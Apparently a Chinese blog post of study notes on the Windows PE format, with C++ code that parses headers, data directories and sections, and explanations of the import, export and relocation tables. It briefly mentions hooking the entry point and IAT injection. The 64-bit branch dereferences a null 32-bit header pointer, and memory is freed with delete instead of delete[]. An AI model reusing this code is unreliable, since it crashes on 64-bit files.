class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;winnt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;ImageHlp.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> _tmain()</span><br><span class="line">&#123;</span><br><span class="line">_tsetlocale(LC_ALL, _T(<span class="string">&quot;Chinese-simplified&quot;</span>));</span><br><span class="line"><span class="comment">//获得文件句柄</span></span><br><span class="line"><span class="type">char</span>* VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">DWORD FileSizeLow = <span class="number">0</span>;</span><br><span class="line">DWORD FileSizeHigh = <span class="number">0</span>;</span><br><span class="line">DWORD  NumberOfBytesRead = <span class="number">0</span>;</span><br><span class="line">PIMAGE_DOS_HEADER ImageDosHeader = <span class="literal">NULL</span>; <span class="comment">//指针</span></span><br><span class="line">PIMAGE_NT_HEADERS ImageNtHeaders = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_FILE_HEADER ImageFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER32 ImageOptionalHeader32 = <span class="literal">NULL</span>;   <span class="comment">//区分32与64</span></span><br><span class="line">PIMAGE_OPTIONAL_HEADER64 ImageOptionalHeader64 = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_DATA_DIRECTORY    ImageDataDirectory = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_SECTION_HEADER    ImageSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">WORD Characteristics = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;%p\r\n&quot;</span>), <span class="built_in">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line"></span><br><span class="line">TCHAR  v2[] = _T(<span class="string">&quot;CFF Explorer.exe&quot;</span>);  <span class="comment">//二进制文件</span></span><br><span class="line">TCHAR  v1[] = _T(<span class="string">&quot;avfilter-6.dll&quot;</span>);</span><br><span class="line">TCHAR  v3[] = _T(<span class="string">&quot;hidden.sys&quot;</span>);</span><br><span class="line">TCHAR  v4[] = _T(<span class="string">&quot;PE文件格式.exe&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//根据文件路径打开文件</span></span><br><span class="line"><span class="comment">//文件句柄</span></span><br><span class="line">HANDLE FileHandle = <span class="built_in">CreateFile</span>(v1, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING,</span><br><span class="line">FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FileHandle == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据文件句柄获取文件大小</span></span><br><span class="line">FileSizeLow = <span class="built_in">GetFileSize</span>(FileHandle, &amp;FileSizeHigh);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (FileSizeLow == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//根据文件大小进程内存申请</span></span><br><span class="line">VirtualAddress = <span class="keyword">new</span> <span class="type">char</span>[FileSizeLow];</span><br><span class="line"><span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//读取文件内容到我们动态申请的内存中</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">ReadFile</span>(FileHandle, VirtualAddress, FileSizeLow, &amp;NumberOfBytesRead, <span class="literal">NULL</span>) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">ImageDosHeader = (PIMAGE_DOS_HEADER)VirtualAddress;</span><br><span class="line"><span class="keyword">if</span> (ImageDosHeader-&gt;e_magic != IMAGE_DOS_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//VA RVA</span></span><br><span class="line">ImageNtHeaders = (PIMAGE_NT_HEADERS)(VirtualAddress + (ImageDosHeader-&gt;e_lfanew));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageNtHeaders-&gt;Signature != IMAGE_NT_SIGNATURE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ImageFileHeader = &amp;(ImageNtHeaders-&gt;FileHeader);   <span class="comment">//定位到了第三个PE结构</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader == <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (ImageFileHeader-&gt;Machine)  <span class="comment">//判断出该PE文件的位数  exe dll sys</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> IMAGE_FILE_MACHINE_I386:</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;x86Pe文件\r\n&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IMAGE_FILE_MACHINE_IA64:</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Intelx64Pe文件\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> IMAGE_FILE_MACHINE_AMD64:</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Amdx64Pe文件\r\n&quot;</span>));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;NumberOfSections:%d\r\n&quot;</span>), ImageFileHeader-&gt;NumberOfSections);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;SizeOfOptionalHeader:%p\r\n&quot;</span>), ImageFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;Machine == IMAGE_FILE_MACHINE_I386)  <span class="comment">//判断正在分析的PE文件的位数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;SizeOfOptionalHeader != <span class="built_in">sizeof</span>(IMAGE_OPTIONAL_HEADER32))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">ImageOptionalHeader32 = (PIMAGE_OPTIONAL_HEADER32)&amp;(ImageNtHeaders-&gt;OptionalHeader);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ImageFileHeader-&gt;Machine == IMAGE_FILE_MACHINE_IA64 ||</span><br><span class="line">ImageFileHeader-&gt;Machine == IMAGE_FILE_MACHINE_AMD64)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;SizeOfOptionalHeader != <span class="built_in">sizeof</span>(IMAGE_OPTIONAL_HEADER64))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line">ImageOptionalHeader64 = (PIMAGE_OPTIONAL_HEADER64)&amp;(ImageNtHeaders-&gt;OptionalHeader);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;Characteristics &amp; IMAGE_FILE_EXECUTABLE_IMAGE)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;ExecutableImage文件\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;Characteristics &amp; IMAGE_FILE_SYSTEM)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;System文件\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ImageFileHeader-&gt;Characteristics &amp; IMAGE_FILE_DLL)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;Dll文件\r\n&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader32 != <span class="literal">NULL</span>)   <span class="comment">//真正分析的Pe文件是个32位</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader32-&gt;Magic != IMAGE_NT_OPTIONAL_HDR32_MAGIC)   <span class="comment">//PE</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//4个字节的RVA</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;程序最先执行的代码起始位置的RVA%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;AddressOfEntryPoint);  <span class="comment">//Hook OEP</span></span><br><span class="line"><span class="comment">//4个字节的绝对地址</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;优先装载地址%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;ImageBase);</span><br><span class="line"></span><br><span class="line"><span class="comment">//重点概念</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;文件对齐粒度%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;FileAlignment);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;内存对齐粒度%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SectionAlignment);</span><br><span class="line"></span><br><span class="line"><span class="comment">//exe 0x400000</span></span><br><span class="line"><span class="comment">//dll 0x10000000</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;镜像大小%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SizeOfImage);  <span class="comment">//内存粒度对齐后的整个PE文件的大小</span></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;所有头部大小%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SizeOfHeaders);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;子系统%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;Subsystem);      <span class="comment">//可以判断该PE文件的文件属性</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重点的重点</span></span><br><span class="line"><span class="comment">//设计16结构体组成的结构体数组</span></span><br><span class="line"><span class="comment">//每个结构体由两个成员组成</span></span><br><span class="line">ImageDataDirectory = &amp;(ImageOptionalHeader32-&gt;DataDirectory[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>;i &lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES;i++)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;%d VirtualAddress:%p\r\n&quot;</span>),i, ImageDataDirectory-&gt;VirtualAddress);     </span><br><span class="line">_tprintf(_T(<span class="string">&quot;%d ViewSize:%p\r\n&quot;</span>), i,ImageDataDirectory-&gt;Size);</span><br><span class="line"></span><br><span class="line">ImageDataDirectory++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader64 != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageOptionalHeader32-&gt;Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC)   <span class="comment">//PE+</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">goto</span> Exit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//4个字节</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;程序最先执行的代码起始位置的:RVA%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;AddressOfEntryPoint);</span><br><span class="line"><span class="comment">//8个字节的绝对地址</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;优先装载地址%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;ImageBase);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;文件对齐粒度%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;FileAlignment);   <span class="comment">//0x200</span></span><br><span class="line">_tprintf(_T(<span class="string">&quot;内存对齐粒度%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SectionAlignment);<span class="comment">//0x1000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;镜像大小%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SizeOfImage);</span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;所有头部大小%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;SizeOfHeaders);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;子系统%p\r\n&quot;</span>), ImageOptionalHeader32-&gt;Subsystem);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//重点的重点</span></span><br><span class="line">ImageDataDirectory = &amp;(ImageOptionalHeader32-&gt;DataDirectory[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; IMAGE_NUMBEROF_DIRECTORY_ENTRIES; i++)</span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;%d VirtualAddress:%p\r\n&quot;</span>), i, ImageDataDirectory-&gt;VirtualAddress);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;%d ViewSize:%p\r\n&quot;</span>), i, ImageDataDirectory-&gt;Size);</span><br><span class="line"></span><br><span class="line">ImageDataDirectory++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">#define IMAGE_FIRST_SECTION( ntheader ) ((PIMAGE_SECTION_HEADER)        \</span></span><br><span class="line"><span class="comment">((ULONG_PTR)(ntheader) +                                            \</span></span><br><span class="line"><span class="comment">FIELD_OFFSET( IMAGE_NT_HEADERS, OptionalHeader ) +                 \</span></span><br><span class="line"><span class="comment"> ((ntheader))-&gt;FileHeader.SizeOfOptionalHeader   \</span></span><br><span class="line"><span class="comment">))</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">ImageSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(ImageNtHeaders);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; ImageFileHeader-&gt;NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\r\n&quot;</span>, ImageSectionHeader-&gt;Name);  <span class="comment">//8个字节构成的节的名字</span></span><br><span class="line"></span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区大小(真实大小)%p\r\n&quot;</span>), ImageSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区起始位置(内存粒度RVA)%p\r\n&quot;</span>), ImageSectionHeader-&gt;VirtualAddress);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区大小(文件粒度)%p\r\n&quot;</span>), ImageSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区起始位置(文件粒度)%p\r\n&quot;</span>), ImageSectionHeader-&gt;PointerToRawData);</span><br><span class="line">_tprintf(_T(<span class="string">&quot;节区属性%p\r\n&quot;</span>), ImageSectionHeader-&gt;Characteristics);   <span class="comment">//获取该节的属性</span></span><br><span class="line">ImageSectionHeader++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"><span class="keyword">if</span> (VirtualAddress != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">delete</span> VirtualAddress;</span><br><span class="line">VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (FileHandle != INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(FileHandle);</span><br><span class="line">FileHandle = INVALID_HANDLE_VALUE;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//内存粒度转换文件粒度</span></span><br><span class="line"><span class="function">DWORD <span class="title">rva_to_offset</span><span class="params">(IMAGE_NT_HEADERS* ImageNtHeaders, DWORD Rva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD Offset = <span class="number">0</span>;</span><br><span class="line">DWORD Limit;</span><br><span class="line">IMAGE_SECTION_HEADER* ImageSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">WORD i;<span class="comment">//两个字节</span></span><br><span class="line"></span><br><span class="line">ImageSectionHeader = <span class="built_in">IMAGE_FIRST_SECTION</span>(ImageNtHeaders);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Rva &lt; ImageSectionHeader-&gt;PointerToRawData)</span><br><span class="line"><span class="keyword">return</span> Rva;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ImageNtHeaders-&gt;FileHeader.NumberOfSections; i++)   </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageSectionHeader[i].SizeOfRawData)</span><br><span class="line">Limit = ImageSectionHeader[i].SizeOfRawData;   <span class="comment">//1.90  文件粒度</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">Limit = ImageSectionHeader[i].Misc.VirtualSize;<span class="comment">//1.70</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (Rva &gt;= ImageSectionHeader[i].VirtualAddress &amp;&amp;        <span class="comment">//内存粒度开始位置</span></span><br><span class="line">Rva &lt; (ImageSectionHeader[i].VirtualAddress + Limit))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (ImageSectionHeader[i].PointerToRawData != <span class="number">0</span>)<span class="comment">//文件粒度开始位置</span></span><br><span class="line">&#123;</span><br><span class="line">Offset = Rva - ImageSectionHeader[i].VirtualAddress;</span><br><span class="line">Offset += ImageSectionHeader[i].PointerToRawData;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> Offset;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件头成员</p><p>mechine 可以判断位数。IMAGE_FILE_MACHINE_I386, IMAGE_FILE_MACHINE_IA64, IMAGE_FILE_MACHINE_AMD64。</p><p><img src="/.io//image-20220909212322047.png" alt="image-20220909212322047"></p><p>因此32位文件，必须在文件头中的sizeofoptional成员，等于32位的结构体。</p><p>可以通过判断characteristics的值，判断该文件的具体属性，0x2（IMAGE_FILE_EXECUTABLE_IMAGE）是exe，0x2000（IMAGE_FILE_DLL）是dll，0x1000（IMAGE_FILE_SYSTEM）是sys。文件可能有多属性，判断时用与运算。这个数字可能有多个属性组成，随便写一个按f12进去看定义可以寻找</p><p>32和64位的区别就在于选项头ImageOptionalHeader。</p><p><img src="/.io//image-20220909221218017.png" alt="image-20220909221218017"></p><p><img src="/.io//image-20220919221914062.png" alt="image-20220919221914062"></p><p><img src="/.io//image-20220919211254300.png" alt="image-20220919211254300"></p><p>OEP，程序执行的代码起始地址，是一个RVA，加上基地址ImageBase是程序的执行入口</p><p>ImageBase是一个绝对地址VA，预设加载值，当PE文件真正开始执行时，就优先放到ImageBase，否则就向下顺延。</p><p><img src="/.io//image-20220919221512162.png" alt="image-20220919221512162"></p><p>读取文件到内存里，节区对齐力度是按百对齐 ImageOptionalHeader-&gt;FileAlignment&#x3D;&#x3D;200，节区在磁盘文件中的最小单位</p><p>PE加载器加载、exe加载dll文件等，驱使PE文件变为运行状态，节区对齐粒度是按千对齐，ImageOpetionalHeader-&gt;SectionAlignment&#x3D;&#x3D;1000 节区在内存中的最小单位</p><p><strong>所有在PE文件中定义成RVA的成员，都必须以内存力度（按千）对齐结构为基础进行VA值得获取</strong></p><p><img src="/.io//image-20220919222939288.png" alt="image-20220919222939288"></p><p>Subsystem可以判断文件类型。0是unknown gui文件有define为IMAGE_SUBSYSTEM_WINDOWS_GUI，按f12进入看其他的</p><p>NumberOfRvaAndSizes一般是16，但也有可能不是</p><p>有#define IMAGE_NUMBER_DIRECTOY_NUMS 16</p><p>重点：</p><p>DataDirectory 设计16成员组成的数组，每个结构体内有两个成员:VirtualAddress(RVA), ViewSize(Size)，0-15</p><p><img src="/.io//image-20230214020404518.png" alt="image-20230214020404518"></p><p><img src="/.io//image-20220921212701408.png" alt="image-20220921212701408"></p><p>在NtHeaders内有一个Signature成员，使用Signature+OptionalHeaders（选项头之前的大小）+SizeOfOptionalHeaders（选项头自身的大小）就可以定位到SectionHeaders(IMAGE_FIRST_SECTION(ImageNtHeaders);)</p><p><img src="/.io//image-20221127212121731.png" alt="image-20221127212121731"></p><p>微软自带的计算偏移的宏FIELD_OFFSET(type, v1);返回值为long型，可以得到v1在type类型中的偏移。</p><p>ImageFileHeader中有一个成员是NumberOfSections，代表有多少个节。ImageSectionHeader的Name成员是节的名字，由8个字节构成，如.text</p><p><img src="/.io//image-20220921214700402.png" alt="image-20220921214700402"></p><p><img src="/.io//image-20221127213230589.png" alt="image-20221127213230589"></p><p><img src="/.io//image-20220921214759832.png" alt="image-20220921214759832"></p><p>节区头中的重要成员，分别是真实大小(没有填充过的)，内存粒度，文件粒度，文件粒度</p><p><img src="/.io//image-20220921222121985.png" alt="image-20220921222121985"></p><p>节头中有个联合体misc，其中virtualSize是真实节大小</p><p>VirtualAddress RVA 按千对齐 节的起始位置</p><p>SizeOfRawData 节的大小，按200对齐</p><p>PointerToRawData 磁盘上节的开始位置，按200对齐</p><p>VA绝对地址 RVA相对地址 </p><p>RVA+ImageBase &#x3D; VA</p><p><strong>内存粒度RVA计算文件粒度公式</strong></p><p>如果传入的rva比第一个ImageSectionHeader的pointer to raw data还要小，说明这是一个头部的rva，两边一样，直接返回。否则开始扫描传入的rva属于第几个节。如果size of raw data有值，则把它放进limit变量中（按文件粒度对齐后的节大小），若没有就放入virtual size。如果rva在section header中的virtual address与virtual address+limit之间，则就是在这个区域中。</p><p>rva-VirtualAddress+PointToRawData&#x3D;offset</p><p><img src="/.io//image-20220926213113330.png" alt="image-20220926213113330"></p><p><img src="/.io//image-20220926214809108.png" alt="image-20220926214809108"></p><p>IAT   导入表</p><p><img src="/.io//image-20220926220732761.png" alt="image-20220926220732761"></p><p><img src="/.io//image-20220926222012185.png" alt="image-20220926222012185"></p><p>导入函数的汇编，32位下是绝对地址，64位下是相对地址，当前地址加偏移加字节数（6）。所有API的调用均采用这种方式。</p><p><img src="/.io//image-20221002193052700.png" alt="image-20221002193052700"></p><p><img src="/.io//image-20221002193042925.png" alt="image-20221002193042925"></p><p><img src="/.io//image-20221002193334312.png" alt="image-20221002193334312"></p><p>动态库的基地址在不同的区域中，不一定在同一个地方</p><p>编译生成exe的时候，系统就会生成一个ImageBase，32位下一般是0x400000，dll一般是0x1000000</p><p>exe文件有导入表IAT，一般在txt节中。在DataDirectory的16成员中，第二成员指向导入表的位置。即定位到</p><p>IMAGE_IMPORT_DESCRIPTOR 导入表描述</p><p><img src="/.io//image-20221002201505020.png" alt="image-20221002201505020"></p><p>结构体中的Name是单字string，存放的是RVA。RVA在32、64下都是四个字节。通过转化为文件粒度，加上VirtualAddress可以定位到导入库的名字。需要强转为char*</p><p>OriginalFirstThunk INT库的地址，RVA 每次都要判断所指向的任意内容是否为空，如ul.AddressOfData。转化为offset，加上VirtualAddress，定位到新的结构体，函数名字导入。指向的结构为IMAGE_THUNK_DATA有64位和32位之分，且是一个联合体ul，64位8字节32位4字节。需要强转为DWORD。如果判断为不是名字，则是索引导入。直接用这个值转化为IMAGE_ORDINAL。文件状态下的文件粒度对齐</p><p><img src="/.io//image-20221204232839654.png" alt="image-20221204232839654"></p><p>FirstThunk IAT的地址，RVA 每次都要判断所指向的任意内容是否为空。进入运行状态时其中内容已经更新为地址。运行状态下内存粒度对齐。通过修改FirstThunk中的内容，可以进行IAT注入。</p><p><img src="/.io//image-20221002202630963.png" alt="image-20221002202630963"></p><p><img src="/.io//image-20230119000531876.png" alt="image-20230119000531876"></p><p><img src="/.io//image-20230119001557338.png" alt="image-20230119001557338"></p><p><img src="/.io//image-20221002202822313.png" alt="image-20221002202822313"></p><p>INT与IAT是联合体，32位下是四个字节，64位下是8个字节。</p><p>导出表</p><p>存在dll中，只有一个</p><p>导出表目录 PIMAGE_EXPORT_DIRECTORY 像导入表目录一样定位</p><p><img src="/.io//image-20221214212322335.png" alt="image-20221214212322335"></p><p>有索引、函数名导出两种方式</p><p><img src="/.io//image-20221214214327363.png" alt="image-20221214214327363"></p><p>重定向表 relocation</p><p>exe文件加载时，image base默认地址为0x400000，此时代码地址都不需要变化。但如果image base地址不是默认值，就需要重新修复，这就需要把默认情况下地址都存放在重定向表中。</p><p>进行修复时，使用真实值-0x400000，加上默认情况下的值</p><p>主要针对绝对寻址的，如全局变量、静态变量、自己定义的函数</p><p><img src="/.io//image-20221231224618748.png" alt="image-20221231224618748"></p><p>重定向表不止一张。virtualaddress需要进行rva to offset转换</p><p><img src="/.io//image-20221231225852866.png" alt="image-20221231225852866"></p><p><img 